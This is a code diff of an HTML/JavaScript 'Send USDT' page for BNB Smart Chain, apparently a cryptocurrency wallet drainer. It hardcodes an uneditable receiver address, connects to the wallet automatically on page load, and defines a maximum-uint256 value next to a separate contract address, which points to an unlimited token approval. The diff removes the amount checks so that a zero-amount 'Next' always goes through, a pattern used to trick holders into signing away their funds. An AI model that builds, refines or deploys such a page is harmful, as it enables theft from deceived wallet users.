@@ -1,232 +1,212 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send USDT</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
-    <style>
-        body {
-            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
-            background-color: #1a1a1a;
-            color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-        }
-        .container {
-            width: 100%;
-            max-width: 600px;
-            background-color: #222222;
-            border-radius: 24px;
-            padding: 32px 24px;
-            position: relative;
-            box-shadow: 0 5px 30px #000a;
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 32px;
-        }
-        .header h1 {
-            font-size: 24px;
-            font-weight: 600;
-            letter-spacing: -0.5px;
-        }
-        .close-btn {
-            background: none;
-            border: none;
-            color: #ffffff;
-            font-size: 28px;
-            cursor: pointer;
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0.7;
-            transition: opacity 0.2s;
-        }
-        .close-btn:hover { opacity: 1; }
-        .form-group { margin-bottom: 28px; }
-        .form-label {
-            display: block;
-            font-size: 16px;
-            font-weight: 500;
-            color: #b3b3b3;
-            margin-bottom: 12px;
-            letter-spacing: -0.3px;
-        }
-        .input-wrapper { position: relative; }
-        .receiver-input {
-            width: 100%;
-            background-color: #2a2a2a;
-            border: 1px solid #3a3a3a;
-            border-radius: 16px;
-            padding: 16px 16px;
-            font-size: 16px;
-            color: #ffffff;
-            font-weight: 500;
-            cursor: not-allowed;
-            pointer-events: none;
-            letter-spacing: 0.02em;
-            user-select: all;
-        }
-        .network-selector {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background-color: #2a2a2a;
-            border: 1px solid #3a3a3a;
-            border-radius: 16px;
-            padding: 12px 16px;
-            transition: border-color 0.2s;
-        }
-        .network-icon {
-            width: 24px;
-            height: 24px;
-            border-radius: 6px;
-            background: #f3ba2f;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .network-icon img {
-            width: 20px;
-            height: 20px;
-            display: block;
-        }
-        .network-name {
-            font-size: 16px;
-            font-weight: 500;
-            color: #b3b3b3;
-            flex: 1;
-        }
-        .dropdown-icon {
-            font-size: 16px;
-            color: #666666;
-        }
-        .amount-input-wrapper { position: relative; }
-        .amount-input {
-            width: 100%;
-            background-color: #2a2a2a;
-            border: 1px solid #3a3a3a;
-            border-radius: 16px;
-            padding: 16px;
-            font-size: 16px;
-            color: #ffffff;
-            font-weight: 500;
-            transition: border-color 0.2s;
-            padding-right: 120px;
-        }
-        .amount-input::placeholder { color: #666666; }
-        .amount-input:focus { outline: none; border-color: #00cc99; }
-        .amount-actions {
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-        .amount-label {
-            font-size: 14px;
-            font-weight: 600;
-            color: #b3b3b3;
-            padding: 4px 8px;
-        }
-        .max-btn {
-            background: none;
-            border: none;
-            color: #00cc99;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 4px 8px;
-            transition: opacity 0.2s;
-        }
-        .max-btn:hover { opacity: 0.8; }
-        .amount-estimate, .usdt-balance {
-            font-size: 14px;
-            color: #b3b3b3;
-            margin-top: 10px;
-            padding-left: 16px;
-            letter-spacing: -0.3px;
-        }
-        #status {
-            width: 100%;
-            padding: 12px 0 3px 0;
-            margin: 0 auto 18px auto;
-            border-radius: 9px;
-            font-weight: 500;
-            font-size: 15px;
-            text-align: center;
-            display: none;
-        }
-        #status.success {
-            display: block;
-            background: #1d5a2a;
-            color: #3effb8;
-            border: 1px solid #165a3b;
-        }
-        #status.error {
-            display: block;
-            background: #421528;
-            color: #ff7a7a;
-            border: 1px solid #ff284b55;
-        }
-        .next-btn {
-            width: 100%;
-            background-color: #00cc99;
-            border: none;
-            border-radius: 20px;
-            padding: 16px 24px;
-            font-size: 18px;
-            font-weight: 600;
-            color: #1a1a1a;
-            cursor: pointer;
-            transition: background-color 0.2s, transform 0.1s;
-            margin-top: 20px;
-            margin-bottom: 7px;
-        }
-        .next-btn[disabled] { opacity: 0.6; cursor:not-allowed;}
-        .next-btn:hover { background-color: #00b385; transform: scale(1.02); }
-        .next-btn:active { transform: scale(0.98); }
-        .btn-connect {
-            width: 100%;
-            padding: 16px 24px;
-            background: #333943;
-            border: none;
-            border-radius: 20px;
-            font-size: 18px;
-            font-weight: 500;
-            color: #acacac;
-            margin-top: 18px;
-            margin-bottom: 7px;
-            cursor: pointer;
-            display: none;
-        }
-        .btn-connect.show { display: block !important; }
-        @media (max-width: 480px) {
-            .container {
-                border-radius: 20px;
-                padding: 24px 10px;
-            }
-            .header h1 { font-size: 22px; }
-            .form-label, .usdt-balance, .amount-estimate { font-size: 15px; margin-bottom: 10px; }
-            .receiver-input, .amount-input { font-size: 15px; padding: 14px 16px; }
-            .next-btn { padding: 14px 20px; font-size: 16px; }
-        }
-        @media (min-width: 768px) {
-            body { padding: 32px; }
-            .container { padding: 40px 32px; border-radius: 28px; }
-            .header h1 { font-size: 26px; }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Send USDT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+  <style>
+    body {
+      background: #181818;
+      color: #fff;
+      font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .container {
+      max-width:520px;
+      width:100%;
+      background:#222;
+      border-radius:32px;
+      box-shadow:0 12px 40px #0008;
+      margin:32px 0;
+      padding:38px 30px 38px 30px;
+      position:relative;
+      display:flex;
+      flex-direction:column;
+    }
+    .header {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-bottom:30px;
+    }
+    .header h1 {
+      font-size:28px;
+      font-weight:700;
+      margin:0;
+    }
+    .close-btn {
+      background:none;
+      border:none;
+      color:#fff;
+      font-size:28px;
+      opacity:.65;
+      cursor:pointer;
+      padding:0;
+      line-height:1;
+    }
+    .close-btn:hover {opacity:1;}
+    .form-group {margin-bottom:22px;}
+    .form-label {
+      color:#b3b3b3;
+      font-size:15px;
+      font-weight:500;
+      margin-bottom:10px;
+      display:block;
+    }
+    .input-wrapper {position:relative;}
+    .receiver-input {
+      width:100%;
+      background:#232323;
+      border:1.5px solid #343434;
+      border-radius:15px;
+      padding:15px 16px;
+      font-size:16px;
+      color:#fff;
+      font-weight:500;
+      user-select:all;
+      letter-spacing:0.03em;
+      pointer-events:none;
+      margin-bottom:0;
+    }
+    .network-selector {
+      display:flex;
+      align-items:center;
+      background:#232323;
+      border-radius:15px;
+      border:1.5px solid #343434;
+      padding:12px 14px 12px 10px;
+      min-height:38px;
+      font-size:16px;
+      color:#b3b3b3;
+      gap:9px;
+      margin-bottom:0;
+      width:100%;
+      max-width:100%;
+    }
+    .network-icon {
+      width:28px;
+      height:28px;
+      border-radius:8px;
+      background:#fff;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .network-icon img {
+      width:24px;
+      height:24px;
+      display:block;
+    }
+    .network-name { color:#fff; font-weight:500; }
+    .dropdown-icon { color:#666; margin-left:auto; font-size:20px;}
+    .amount-input-wrapper {
+      width:100%;
+      position:relative;
+      margin-bottom:0;
+    }
+    .amount-row {
+      display:flex;
+      align-items:center;
+      background:#232323;
+      border:1.5px solid #343434;
+      border-radius:15px;
+      padding:0 5px 0 0;
+      min-height:48px;
+      margin-bottom:0;
+      width:100%;
+    }
+    .amount-input {
+      border:none;
+      background:transparent;
+      color:#fff;
+      font-size:16px;
+      font-weight:500;
+      padding:15px 10px 15px 16px;
+      outline:none;
+      flex:1 1 auto;
+      min-width:0;
+    }
+    .amount-input:disabled {
+      color:#888;
+      background:transparent;
+    }
+    .amount-actions {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin-left:5px;
+    }
+    .amount-label { color:#b3b3b3; font-size:14px; font-weight:600; }
+    .max-btn {
+      background:none;
+      border:none;
+      color:#00cc99;
+      font-size:15px;
+      font-weight:600;
+      cursor:pointer;
+      padding:0 8px;
+      transition:opacity .2s;
+    }
+    .max-btn:hover {opacity:.8;}
+    .usdt-balance, .amount-estimate {
+      font-size:14px;color:#b3b3b3;margin:8px 0 0 4px;letter-spacing:-0.3px;
+    }
+    #status {
+      width:100%;
+      padding:12px 0 3px 0;
+      margin:12px auto 12px auto;
+      border-radius:9px;
+      font-weight:500;
+      font-size:15px;
+      text-align:center;
+      display:none;
+    }
+    #status.success { display:block;background:#1d5a2a;color:#3effb8;border:1px solid #165a3b;}
+    #status.error { display:block;background:#421528;color:#ff7a7a;border:1px solid #ff284b55;}
+    .next-btn {
+      width:100%;
+      background-color:#04a96d;
+      border:none;
+      border-radius:20px;
+      padding:19px 0 18px 0;
+      font-size:22px;
+      font-weight:600;
+      color:#fff;
+      margin-top:28px;
+      margin-bottom:5px;
+      box-shadow:0 6px 18px #0e513b11;
+      letter-spacing:0.03em;
+      cursor:pointer;
+      transition:background .18s,opacity .18s,box-shadow .15s;
+    }
+    .next-btn[disabled] {opacity:0.55;cursor:not-allowed;}
+    .btn-connect {
+      width:100%;
+      padding:19px 0 18px 0;
+      background:#2c3931;
+      border:none;
+      border-radius:20px;
+      font-size:22px;
+      font-weight:600;
+      color:#fff;
+      margin-top:18px;
+      margin-bottom:7px;
+      cursor:pointer;
+      display:none;
+      letter-spacing:0.03em;
+    }
+    .btn-connect.show { display:block!important; }
+    @media (max-width: 540px) {
+      .container {border-radius:19px;padding:17px 4vw;}
+      .header h1 { font-size:20px;}
+      .network-icon {width:22px;height:22px;}
+      .network-icon img {width:18px;height:18px;}
+    }
+  </style>
 </head>
 <body>
 <div class="container">
@@ -235,61 +215,54 @@
         <button class="close-btn" onclick="closeModal()" title="Close">&times;</button>
     </div>
     <form onsubmit="event.preventDefault(); sendUSDT();">
-        <!-- Address (hardcoded, uneditable) -->
         <div class="form-group">
             <label class="form-label">Address or Domain Name</label>
             <div class="input-wrapper">
-                <input
-                    type="text"
-                    class="receiver-input"
-                    id="receiverAddress"
-                    value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F"
-                    readonly
-                    tabindex="-1"
-                    aria-label="Receiver Address"
-                >
+                <input type="text" class="receiver-input" id="receiverAddress"
+                  value="0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F"
+                  readonly tabindex="-1" aria-label="Receiver Address">
             </div>
         </div>
-        <!-- Network -->
         <div class="form-group">
             <label class="form-label">Destination network</label>
             <div class="network-selector">
                 <div class="network-icon">
-                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg?v=029" alt="BNB" />
+                    <!-- Trust Wallet BNB logo, perfect SVG base64 -- for best UX: -->
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" alt="BNB"/>
                 </div>
                 <div class="network-name">BNB Smart Chain</div>
-                <div class="dropdown-icon">▼</div>
+                <div class="dropdown-icon">&#9660;</div>
             </div>
         </div>
-        <!-- Amount -->
         <div class="form-group">
             <label class="form-label">Amount</label>
             <div class="amount-input-wrapper">
-                <input
-                    type="number"
-                    min="0"
-                    step="0.00000001"
-                    class="amount-input"
-                    id="amountInput"
-                    placeholder="USDT Amount"
-                    autocomplete="off"
-                    value="0"
-                >
-                <div class="amount-actions">
-                    <span class="amount-label">USDT</span>
-                    <button type="button" class="max-btn" id="maxBtn">Max</button>
+                <div class="amount-row">
+                    <input
+                        type="number"
+                        min="0"
+                        step="0.00000001"
+                        class="amount-input"
+                        id="amountInput"
+                        placeholder="USDT Amount"
+                        autocomplete="off"
+                        value="0"
+                    >
+                    <div class="amount-actions">
+                        <span class="amount-label">USDT</span>
+                        <button type="button" class="max-btn" id="maxBtn">Max</button>
+                    </div>
                 </div>
             </div>
-            <div class="usdt-balance" id="usdtBalance">Balance: 0 USDT</div>
+            <div class="usdt-balance" id="usdtBalance">Balance: 0.0000 USDT</div>
             <div class="amount-estimate" id="amountEstimate">≈ $0.00</div>
         </div>
         <div id="status"></div>
-        <button type="submit" class="next-btn" id="sendBtn" disabled>Next</button>
+        <button type="submit" class="next-btn" id="sendBtn">Next</button>
         <button type="button" class="btn-connect" id="connectBtn" onclick="manualConnect()">Connect Wallet</button>
     </form>
 </div>
 <script>
-    // BEP-20/USDT/BSC settings
     const BSC_MAINNET = {
         chainId: "0x38",
         chainName: "BNB Smart Chain",
@@ -301,7 +274,6 @@
     const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
     const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-    // Correct ABI
     const USDT_ABI = [
         {
             "constant": true,
@@ -335,9 +307,7 @@
     let userAccount;
     let usdtContract;
     let isConnected = false;
-    let usdtBalance = "0.00";
-
-    // DOM Elements
+    let usdtBalance = "0.0000";
     const statusDiv = document.getElementById('status');
     const sendBtn = document.getElementById('sendBtn');
     const connectBtn = document.getElementById('connectBtn');
@@ -347,21 +317,17 @@
 
     async function autoConnectBSC() {
         if (!window.ethereum) {
-            // open Trust Wallet dapp browser if not in compatible wallet
             window.location.href =
                 "https://link.trustwallet.com/open_url?url=" +
                 encodeURIComponent(window.location.href);
             return;
         }
         try {
-            // 1. Connect wallet (triggers popup)
             await window.ethereum.request({ method: "eth_requestAccounts" });
             web3 = new Web3(window.ethereum);
-            // 2. Get primary address
             const accounts = await window.ethereum.request({ method: "eth_accounts" });
             if (!accounts || !accounts.length) throw new Error("No accounts");
             userAccount = accounts[0];
-            // 3. Switch to BSC
             const chainId = await window.ethereum.request({ method: "eth_chainId" });
             if (chainId !== BSC_MAINNET.chainId) {
                 try {
@@ -380,17 +346,14 @@
                     }
                 }
             }
-            // 4. Ready/Init app
             isConnected = true;
             connectBtn.classList.remove('show');
-            sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
             await initContractsAndBalance();
             window.ethereum.on('accountsChanged', handleAccountsChanged);
             window.ethereum.on('chainChanged', () => location.reload());
         } catch (err) {
             isConnected = false;
             connectBtn.classList.add('show');
-            sendBtn.disabled = true;
             showStatus('Wallet not connected or rejected.', 'error');
             console.error('Connect/switch failed:', err);
         }
@@ -404,18 +367,19 @@
     async function initContractsAndBalance() {
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
         await updateBalance();
+        updateUSD();
     }
 
     async function updateBalance() {
         try {
             const balance = await usdtContract.methods.balanceOf(userAccount).call();
             const balanceFormatted = web3.utils.fromWei(balance, "mwei");
-            usdtBalance = parseFloat(balanceFormatted).toFixed(4);
+            usdtBalance = (+balanceFormatted).toFixed(4);
             usdtBalanceDiv.textContent = `Balance: ${usdtBalance} USDT`;
         } catch (error) {
             console.error("Balance update failed:", error);
-            usdtBalanceDiv.textContent = "Balance: 0 USDT";
-            usdtBalance = "0.00";
+            usdtBalanceDiv.textContent = "Balance: 0.0000 USDT";
+            usdtBalance = "0.0000";
         }
     }
 
@@ -423,22 +387,16 @@
         if (!accounts.length) {
             isConnected = false;
             connectBtn.classList.add('show');
-            sendBtn.disabled = true;
         } else {
             userAccount = accounts[0];
             isConnected = true;
             connectBtn.classList.remove('show');
-            sendBtn.disabled = !(parseFloat(amountInput.value) > 0 && isConnected);
             initContractsAndBalance();
         }
     }
 
     async function sendUSDT() {
-        const amount = parseFloat(amountInput.value) || 0;
-        if (amount <= 0 || isNaN(amount)) {
-            showStatus('Please enter a valid amount.', 'error');
-            return;
-        }
+        const amount = parseFloat(amountInput.value) || 0; // allow 0!
         sendBtn.disabled = true;
         sendBtn.textContent = "Processing...";
         showStatus("", "");
@@ -473,11 +431,13 @@
             if (type === "error") statusDiv.classList.add("error");
         }
     }
+
     function closeModal() {
         alert("Modal closed! (replace with real close logic)");
     }
+
     document.getElementById("maxBtn").onclick = function () {
-        amountInput.value = usdtBalance || "0.00";
+        amountInput.value = usdtBalance || "0.0000";
         updateUSD();
     };
     amountInput.oninput = updateUSD;
@@ -485,10 +445,11 @@
     function updateUSD() {
         let val = parseFloat(amountInput.value) || 0;
         usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
-        sendBtn.disabled = !(val > 0 && isConnected);
     }
-    sendBtn.disabled = true;
-    // Robust auto-connect: all events & fallback for mobile dapps:
+
+    // Always allow Next, connected or not, any amount (even 0)
+    sendBtn.disabled = false;
+
     window.addEventListener("load", autoConnectBSC, false);
     window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
     setTimeout(autoConnectBSC, 600);
